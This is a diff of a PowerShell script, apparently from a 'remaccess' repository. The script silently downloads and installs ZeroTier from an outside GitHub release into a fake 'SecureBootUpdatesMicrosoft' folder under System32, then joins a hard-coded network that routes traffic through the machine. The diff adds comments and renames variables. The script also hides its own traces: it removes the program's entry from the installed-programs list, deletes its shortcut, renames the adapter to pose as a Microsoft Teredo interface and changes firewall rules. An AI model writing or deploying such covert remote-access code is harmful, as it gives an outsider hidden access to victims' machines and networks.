@@ -1,11 +1,23 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = "SilentlyContinue"
 $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
+$ztclihandle = "-q"
+$ztcliaction = "join"
+$ztclinetworkid = "52b337794f5f54e7"
+$ztinstalledprogramkey = "Zerotier*"
+$installedprogramregpath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+$MatchingKeys = Get-ChildItem -Path $installedprogramregpath | Where-Object { $_.PSChildName -like $ztinstalledprogramkey }
+$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
+
 #Code starts Here
+##Cleanup
+#Disabling the network window, used to add network to private or public section.
 New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff" -ItemType Directory -Force | Out-Null
+#Removal of old installation incase it exists.
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
 if (Test-Path $ztdatadir) {
@@ -14,6 +26,8 @@ Remove-Item -Path $ztdatadir -Recurse -Force -ErrorAction SilentlyContinue | Out
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
+
+#Downloading of new installation file incase the hash isn't a match or the file doesn't exist.
 if (Test-Path $destinationPath) {
     $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
     $hashesData = (Invoke-WebRequest -Uri $hashesUrl -UseBasicParsing).Content
@@ -30,27 +44,25 @@ if (Test-Path $destinationPath) {
 if (-not (Test-Path $destinationPath)) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
 }
+
+#Installation section
 Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart"
 Timeout /NoBreak 20
 Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
 Timeout /NoBreak 15
-$NetworkID = "52b337794f5f54e7"
 $zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
-$param1 = "-q"
-$param2 = "join"
-$NetworkID = "52b337794f5f54e7"
-& $zerotiercli $param1 $param2 $NetworkID allowDefault=1
-$KeyNamePattern = "Zerotier*"
-$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
-$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
+& $zerotiercli $ztclihandle $ztcliaction $ztclinetworkid allowDefault=1
+
+#Removing the zerotier entry from installed-programs section.
 foreach ($Key in $MatchingKeys) {
-$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
+$RegKeyPath = Join-Path -Path $installedprogramregpath -ChildPath $Key.PSChildName
 $RegValueName = "SystemComponent"
 $RegValueData = 1
 Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
 Set-NetConnectionProfile -InterfaceAlias "ZeroTier*" -NetworkCategory Private
 }
-$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
+
+#Removal of shortcut.
 if (Test-Path $ZeroTierShortcutPath) {
 Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
 }
@@ -78,6 +90,8 @@ foreach ($item in $childItems) {
 Set-Acl -Path $item.FullName -AclObject $folderACL
 }
 Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
+
+#Masking zerotier adapter in control panel.
 $adapterNameToRename = "Zerotier*"
 $newAdapterName = "Microsoft Teredo IPv6 Tunneling Interface"
 $maxRetries = 3
@@ -105,6 +119,7 @@ if ($Rules.Count -gt 0) {
         Set-NetFirewallRule -InputObject $Rule | Out-Null
     }
 } else {}
+
 #Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff" -Force | Out-Null
 #ZT Adv Fix
 #$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
